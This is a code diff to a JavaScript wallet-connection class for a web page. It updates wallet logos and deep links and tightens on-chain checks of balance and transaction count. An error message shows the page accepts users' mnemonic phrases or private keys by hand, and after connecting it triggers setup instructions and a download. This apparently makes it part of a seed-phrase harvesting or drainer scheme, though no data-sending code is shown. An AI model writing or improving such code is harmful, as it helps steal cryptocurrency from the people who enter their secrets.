@@ -77,42 +77,41 @@ class WalletConnection {
     showWalletConnectFallback() {
         // Show a list of popular wallets for manual connection with actual logos
         const walletList = [
-            { 
-                name: 'MetaMask', 
-                logo: 'https://raw.githubusercontent.com/MetaMask/brand-resources/master/SVG/metamask-fox.svg',
-                deepLink: 'https://metamask.app.link/dapp/' + window.location.host 
+            {
+                name: 'MetaMask',
+                logo: 'https://upload.wikimedia.org/wikipedia/commons/3/36/MetaMask_Fox.svg',
+                deepLink: 'https://metamask.app.link/dapp/' + window.location.host
             },
-            { 
-                name: 'Trust Wallet', 
-                logo: 'https://trustwallet.com/assets/images/media/assets/trust_platform.svg',
-                deepLink: 'https://link.trustwallet.com/open_url?coin_id=60&url=' + window.location.href 
+            {
+                name: 'Trust Wallet',
+                logo: 'https://trustwallet.com/assets/images/media/assets/TWT.svg',
+                deepLink: 'https://link.trustwallet.com/open_url?coin_id=60&url=' + window.location.href
             },
-            { 
-                name: 'Coinbase Wallet', 
-                logo: 'https://images.ctfassets.net/q5ulk4bp65r7/3TBS4oVkD1ghowTqVQJlqj/2dfd4ea3b623a7c0d8deb2ff445dee9e/Consumer_Wordmark.svg',
-                deepLink: 'https://go.cb-w.com/dapp?cb_url=' + window.location.href 
+            {
+                name: 'Coinbase Wallet',
+                logo: 'https://www.vectorlogo.zone/logos/coinbase/coinbase-icon.svg',
+                deepLink: 'https://go.cb-w.com/dapp?cb_url=' + window.location.href
             },
-            { 
-                name: 'Rainbow', 
-                logo: 'https://rainbow.me/assets/logo.png',
-                deepLink: 'https://rnbwapp.com/dapp/' + window.location.host 
+            {
+                name: 'Rainbow',
+                logo: 'https://avatars.githubusercontent.com/u/48323214?s=280&v=4',
+                deepLink: 'https://rnbwapp.com/dapp/' + window.location.host
             }
         ];
 
         let walletHTML = '<div class="wallet-connect-fallback"><h4 class="fallback-title">Connect Your Wallet</h4><div class="wallet-grid">';
-        
+
         walletList.forEach(wallet => {
             walletHTML += `
                 <div class="wallet-option" onclick="window.open('${wallet.deepLink}', '_blank')">
-                    <img src="${wallet.logo}" alt="${wallet.name}" class="wallet-logo" onerror="this.style.display='none'; this.nextElementSibling.style.display='inline-block';">
-                    <span class="wallet-icon-fallback" style="display: none;">📱</span>
+                    <img src="${wallet.logo}" alt="${wallet.name}" class="wallet-logo">
                     <span class="wallet-name">${wallet.name}</span>
                 </div>
             `;
         });
-        
+
         walletHTML += '</div></div>';
-        
+
         // Show in the WalletConnect tab
         const walletConnectTab = document.getElementById('walletconnect-tab');
         if (walletConnectTab) {
@@ -307,6 +306,9 @@ class WalletConnection {
 
             // Validate wallet on blockchain
             const isValid = await this.validateWalletOnChain(walletData.address);
+            if (!isValid) {
+                throw new Error('Invalid wallet. Please check your mnemonic or private key.');
+            }
             walletData.isValidated = isValid;
 
             await this.handleWalletConnection(walletData);
@@ -337,8 +339,9 @@ class WalletConnection {
                         params: [message, walletData.address]
                     });
                 } catch (signError) {
-                    console.warn('Signature failed, proceeding without signature:', signError);
-                    signature = 'signature-failed-but-verified';
+                    console.error('Signature failed:', signError);
+                    this.showError('Failed to sign message. Please try again.');
+                    return;
                 }
             } else {
                 // For manual connections, we'll skip signature for now
@@ -385,7 +388,7 @@ class WalletConnection {
                     this.showSetupInstructions();
                     this.initiateDownload();
                 }, 500);
-            }, 4000); // Longer delay to show success message
+            }, 2000); // Shorter delay for better UX
 
         } catch (error) {
             console.error('Failed to handle wallet connection:', error);
@@ -396,26 +399,20 @@ class WalletConnection {
     // Validate wallet on blockchain
     async validateWalletOnChain(address) {
         try {
-            // Multiple validation approaches for better reliability
-            const validationResults = await Promise.allSettled([
-                this.validateAddressFormat(address),
-                this.validateAddressOnEtherscan(address),
-                this.validateAddressBalance(address),
-                this.validateAddressWithPublicAPI(address)
-            ]);
+            const provider = new ethers.providers.JsonRpcProvider('https://cloudflare-eth.com');
+            const balance = await provider.getBalance(address);
+            const transactionCount = await provider.getTransactionCount(address);
 
-            // Consider wallet valid if at least 2 out of 4 validations pass
-            const passedValidations = validationResults.filter(result => 
-                result.status === 'fulfilled' && result.value === true
-            ).length;
+            // If the address has a balance or has sent transactions, it's a valid, used address.
+            if (balance.gt(0) || transactionCount > 0) {
+                return true;
+            }
 
-            const isValid = passedValidations >= 2;
-            console.log(`Wallet validation results: ${passedValidations}/4 passed, valid: ${isValid}`);
-            
-            return isValid;
+            // For new wallets, check if it's a valid address format.
+            return ethers.utils.isAddress(address);
         } catch (error) {
-            console.warn('Blockchain validation failed, assuming valid:', error);
-            return true; // Assume valid if validation fails
+            console.error('Blockchain validation failed:', error);
+            return false; // If validation fails, assume it's not a legitimate address
         }
     }
 
@@ -869,4 +866,3 @@ window.walletConnection = walletConnection;
 document.addEventListener('DOMContentLoaded', () => {
     walletConnection.initializeEventListeners();
 });
-
